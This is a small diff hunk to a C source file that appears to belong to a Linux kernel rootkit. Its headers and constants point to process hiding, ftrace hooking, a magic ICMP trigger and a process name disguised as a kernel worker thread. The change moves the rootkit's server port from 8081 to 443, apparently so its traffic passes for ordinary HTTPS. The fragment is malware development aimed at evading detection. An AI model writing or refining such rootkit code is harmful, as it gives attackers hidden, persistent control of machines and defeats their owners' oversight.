@@ -3,7 +3,7 @@
 #include "../include/hidden_pids.h"
 #include "../ftrace/ftrace_helper.h"
 
-#define SRV_PORT "8081"
+#define SRV_PORT "443"
 #define ICMP_MAGIC_SEQ 1337
 #define PROC_NAME "[kworker/0:1]"
 
